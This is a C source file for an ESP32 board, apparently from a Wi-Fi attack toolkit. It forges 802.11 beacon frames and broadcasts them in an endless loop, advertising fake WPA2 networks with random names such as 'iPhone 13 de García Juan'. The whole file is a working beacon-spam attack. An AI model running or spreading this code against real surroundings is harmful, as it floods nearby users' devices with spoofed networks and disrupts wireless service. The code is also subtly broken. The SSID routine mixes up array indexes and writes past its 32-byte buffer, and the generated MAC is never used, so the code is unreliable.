/*
 * beacon_spam.c
 *
 *  Created on: 11 nov. 2024
 *      Author: nicotina
 */

#include <stdio.h>
#include <string.h>
#include "esp_random.h"
#include "wifi.h"

const char *TAG = "attack:beacon_spam:";

const char* nombres[20] = {
    "Juan",
    "María",
    "José",
    "Ana",
    "Luis",
    "Carmen",
    "Pedro",
    "Laura",
    "Jorge",
    "Marta",
    "Carlos",
    "Lucía",
    "Antonio",
    "Sofía",
    "Miguel",
    "Elena",
    "Francisco",
    "Isabel",
    "Manuel",
    "Paula"
};


const char* apellidos[20] = {
    "García",
    "Martínez",
    "Rodríguez",
    "López",
    "Hernández",
    "González",
    "Pérez",
    "Sánchez",
    "Ramírez",
    "Torres",
    "Flores",
    "Rivera",
    "Gómez",
    "Díaz",
    "Cruz",
    "Morales",
    "Ortiz",
    "Vargas",
    "Ramos",
    "Castillo"
};

const char* celulares[20] = {
    "iPhone 13",
    "iPhone 12",
    "Galaxy S21",
    "Galaxy S20",
    "Pixel 6",
    "Pixel 5",
    "Redmi Note 10",
    "Redmi Note 9",
    "OnePlus 9",
    "OnePlus 8",
    "Huawei P40",
    "Mate 40",
    "Moto G Power",
    "Moto G Stylus",
    "Nokia G50",
    "Xperia 1 III",
    "Oppo Find X3",
    "Realme 8",
    "ROG Phone 5",
    "LG V60"
};

uint8_t beaconPacket[109] = {
  /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

  // Fixed parameters
  /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
  /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
  /* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
  /* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation

  // Tagged parameters

  // SSID parameters
  /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
  /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, // SSID

  // Supported Rates
  /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
  /* 72 */ 0x82, // 1(B)
  /* 73 */ 0x84, // 2(B)
  /* 74 */ 0x8b, // 5.5(B)
  /* 75 */ 0x96, // 11(B)
  /* 76 */ 0x24, // 18
  /* 77 */ 0x30, // 24
  /* 78 */ 0x48, // 36
  /* 79 */ 0x6c, // 54

  // Current Channel
  /* 80 - 81 */ 0x03, 0x01, // Channel set, length
  /* 82 */      0x01,       // Current Channel

  // RSN information
  /*  83 -  84 */ 0x30, 0x18,
  /*  85 -  86 */ 0x01, 0x00,
  /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
  /*  91 -  92 */ 0x02, 0x00,
  /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
  /* 101 - 102 */ 0x01, 0x00,
  /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
  /* 107 - 108 */ 0x00, 0x00
};

void generar_ssid(uint8_t *out) {
	uint32_t random = esp_random();
	uint8_t nombreidx = (random)    %20;
	uint8_t apeidx    = (random>>8) %20;
	uint8_t celuidx   = (random>>16)%20;
	int lencel = strlen(celulares[celuidx]);
	int lenape = strlen(apellidos[apeidx]);
	int lennom = strlen(nombres[nombreidx]);
	memcpy(out, celulares[nombreidx], lencel);
	memcpy(out + lencel, " de ", 4);
	memcpy(out + lencel + 4, apellidos[apeidx], lenape);
	memcpy(out + lencel + 4 + lenape, nombres[nombreidx], lennom);
	out[32] = '\0';
	out[31] = '\n';
}

void generar_mac(uint8_t *out) {
	int i;
	for(i = 0; i < 6; ++i) {
		out[i] = random()%256;
	}
}

void send_random_beacon() {
	uint8_t mac[6];
	uint8_t ssid[32] = { 0 };
	
	generar_mac(mac);
	
	uint32_t random = esp_random();
	
	generar_ssid(ssid);
	
	
	uint8_t ssid_len = (uint8_t)strlen((char *)ssid);
	beaconPacket[37] = ssid_len;
	
	memcpy(beaconPacket + 38, ssid, 32);
	memcpy(beaconPacket + 10, ssid, 6);
	memcpy(beaconPacket + 16, ssid, 6);
	
	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, sizeof(beaconPacket), false));
}

void attack_beacon_spam() {
	iniciar_wifi(TAG, WIFI_MODE_AP);
	int i;
	while (true) {
		send_random_beacon();
		vTaskDelay(500 / portTICK_PERIOD_MS);
	}
	
}
